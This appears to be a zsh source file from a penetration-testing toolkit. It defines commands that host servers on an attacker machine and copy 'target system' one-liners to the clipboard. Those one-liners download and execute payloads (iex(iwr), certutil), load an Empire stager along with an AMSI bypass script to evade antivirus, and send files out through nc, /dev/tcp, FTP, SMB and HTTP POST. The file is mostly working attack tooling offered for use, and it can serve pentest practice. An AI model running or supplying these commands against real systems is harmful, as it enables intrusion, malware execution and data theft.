#!/usr/bin/env zsh

############################################################# 
# nb-srv
#############################################################
nb-srv-help() {
    cat << "DOC" | bat --plain --language=help

nb-srv
-------
The srv namespace provides commands for hosting local services such as web, ftp, smb and other services for data exfil or transfer.

Commands to just host a server
-------------------------
nb-srv-web              hosts a python web server in server dir
nb-srv-tftp             starts the atftpd service in /srv/tftp
nb-srv-smtp             hosts a python smtp server in current dir
nb-srv-updog            hosts a updog web server in server dir
nb-srv-ngrok            hosts a ngrok web server in server dir

Commands to download a file from server
-------------------------------------
nb-srv-smb              hosts an impacket smb server in current dir
nb-srv-smb-auth         hosts an impacket smb server with authentication in current dir
nb-srv-ftp-down         hosts a python ftp server in current dir

Commands to upload a file to a server/listener
----------------------------------------------
nb-srv-ftp-up           hosts a python ftp server in current dir
nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
nb-srv-smb-http         hosts an SMB over HTTP server with WebDav in current dir
nb-srv-nc-b64-web       hosts a netcat server > decode b64 file in current dir

General Commands
-------------------------------------
nb-srv-file-download    select one of general commands to download a payload into a target machine
nb-srv-empire-stager    command to download and execute empire stager in a target machine
nb-srv-install          install dependencies



Commands to upload a file to a server/listener on LINUX
-------------------------------------------------------
nb-srv-nc-tar           hosts a netcat server > tar file in current dir
nb-srv-nc-file          hosts a netcat server > file in current dir
nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir

nb-srv-ftp-hosted       hosts a python ftp server in /srv
nb-srv-updog-hosted     hosts an updog web server in /srv

DOC
}

nb-srv-install() {
    __info "Running $0..."
    __pkgs netcat atftpd 
    __pkgs php python python-pip python-smb python-pyftpdlib impacket python-updog

    if ! command -v pyftpdlib &> /dev/null
    then
        __info "pyftpdlib is not installed. Installing..."
        sudo pip3 install pyftpdlib
    fi

    if ! command -v uploadserver &> /dev/null
    then
        __info "uploadserver is not installed. Installing..."
        sudo pip3 install uploadserver
    fi

    if ! command -v wsgidav &> /dev/null
    then
        __info "wsgidav is not installed. Installing..."
        sudo pip3 install wsgidav 
    fi

    if ! command -v cheroot &> /dev/null
    then
        __info "cheroot is not installed. Installing..."
        sudo pip3 install cheroot
    fi
}

nb-srv-file-download() {
    nb-vars-set-lhost
    nb-vars-set-lport
    local filename && __askvar filename "FILENAME"

    clear

    __ask "Choose a command to copy:"
    echo "1.  certutil -URLcache -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
    echo "2.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
    echo "3.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
    echo "4.  Previous menu"
    echo
    echo -n "Choice: "
    read choice

    case $choice in
        1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
        2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
        3) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
        4) exit;;
        *) echo "Invalid option";;
    esac

    echo "$__COMMAND" | wl-copy

    __info "Run the shell using command:"
    __ok "  Start-Process \"shell-name.exe\""
}

nb-srv-empire-stager() {
    nb-vars-set-lhost
    nb-vars-set-lport

    # Path to generated Empire stager
    echo
    __ask "Select generated stager: "
    local dp=$(__menu $(find /var/lib/powershell-empire/empire/client/generated-stagers/ -type f -printf "%P\n"))
    __ok "Selected: ${dp}"

    # Download the stager and bypass AV
    local __COMMAND
    __COMMAND="
iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/amsi.ps1)
iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/${dp})
"

    # Copy the commands to clipboard
    echo "$__COMMAND" | wl-copy
    __info "Commands to download the stager copied to clipboard."

    # MOVE IT TO server
    sudo mv /var/lib/powershell-empire/empire/client/generated-stagers/${dp} $SV

    # Run the server
    echo
    cd "$SV" ; echo "$(hip) in $PWD" ; sudo python3 -m http.server 8000
}

nb-srv-web() {
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
	sudo python3 -m http.server 8000
  popd &> /dev/null
}

nb-srv-uploadserver() {
  nb-vars-set-lhost
  nb-vars-set-lport
  local path && __askvar path "FULL_PATH_TO_FILE"

  echo
  __COMMAND1=IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
  __COMMAND2=Invoke-FileUpload -Uri http://${__LHOST}:${__LPORT}/upload -File $path
  echo "$__COMMAND2" | wl-copy
  echo "$__COMMAND1" | wl-copy
  __info "2 Commands to use on a target system copied to clipboard"

	print -z "sudo python3 -m uploadserver"
}

nb-srv-ftp-down() {
  nb-vars-set-lhost
  local filename && __askvar filename "FILENAME"

  echo
  __COMMAND="(New-Object Net.WebClient).DownloadFile('ftp://${__LHOST}/$filename', 'C:\Users\Public\\$filename')"
  echo "$__COMMAND" | wl-copy
  __info "Command to use on a target system copied to clipboard"

	print -z "sudo python -m pyftpdlib --port 21"
}

nb-srv-ftp-up() {
  nb-vars-set-lhost
  local filename && __askvar filename "FILENAME"
  local path && __askvar path "FULL_PATH_TO_FILE"

  echo
  __COMMAND=(New-Object Net.WebClient).UploadFile('ftp://${__LHOST}/$filename', '$path')
  echo "$__COMMAND" | wl-copy
  __info "Command to use on a target system copied to clipboard"

  print -z "sudo python -m pyftpdlib --port 21 --write"
}

nb-srv-smb() {
  nb-vars-set-lhost
  local filename && __askvar filename "FILENAME"

  echo
  __COMMAND="copy \\${__LHOST}\share\\$filename"
  echo "$__COMMAND" | wl-copy
  __info "Command to use on a target system copied to clipboard"

	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare"
}

nb-srv-smb-http() {
  nb-vars-set-lhost
  local path && __askvar path "FULL_PATH_TO_FILE"

  echo
  __COMMAND1="dir \\${__LHOST}\DavWWWRoot"
  __COMMAND2="copy $path \\${__LHOST}\DavWWWRoot"
  echo $__COMMAND2 | wl-copy
  echo $__COMMAND1 | wl-copy
  __info "2 Commands to use on a target system copied to clipboard"

  print -z "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
}

nb-srv-smb-auth() {
  nb-vars-set-lhost
  local filename && __askvar filename "FILENAME"

  echo
  __COMMAND1="net use n: \\${__LHOST}\share /user:test test"
  __COMMAND2="copy n:\\$filename"
  echo "$__COMMAND2" | wl-copy
  echo "$__COMMAND1" | wl-copy
  __info "2 Commands to use on a target system copied to clipboard"

  # New versions of Windows block unauthenticated guest access, to bypass set username and pass
	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test"
}

nb-srv-ngrok() {
  print -z "ngrok http 4444"
}

nb-srv-tftp() {
	print -z "sudo service atftpd start"
}

nb-srv-smtp() {
	print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"
}

nb-srv-ftp-hosted() {
    __info "Serving content from /srv"
    pushd /srv &> /dev/null
    sudo python -m pyftpdlib -p 21 -w
    popd &> /dev/null
}

nb-srv-updog() {
    print -z "updog -p 443 --ssl -p $(__rand 10)"
}

nb-srv-updog-hosted() {
    __info "Serving content from /srv"
    sudo updog -p 443 --ssl -d /srv
}

nb-srv-nc-tar() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __COMMAND="tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
    echo "$__COMMAND" | wl-copy
    __info "Command to use on a target system copied to clipboard"

    print -z "nc -nvlp ${__LPORT} | tar xfv -"
}

nb-srv-nc-file() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __COMMAND="cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
    echo "$__COMMAND" | wl-copy
    __info "Command to use on a target system copied to clipboard"

    print -z "nc -nvlp ${__LPORT} -w 5 > incoming.txt"  
}

nb-srv-nc-b64() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __COMMAND="openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
    echo "$__COMMAND" | wl-copy
    __info "Command to use on a target system copied to clipboard"

    print -z "nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
}

nb-srv-nc-b64-web() {
    nb-vars-set-lport
    nb-vars-set-lport
    local path && __askvar path "FULL_PATH_TO_FILE"

    echo
    __COMMAND1="$b64 = [System.convert]::ToBase64String((Get-Content -Path '$path' -Encoding Byte))"
    __COMMAND2="Invoke-WebRequest -Uri http://${__LHOST}:${__LPORT}/ -Method POST -Body \\$b64"
    echo "$__COMMAND2" | wl-copy
    echo "$__COMMAND1" | wl-copy
    __info "2 Commands to use on a target system copied to clipboard"

    print -z "nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt"
}
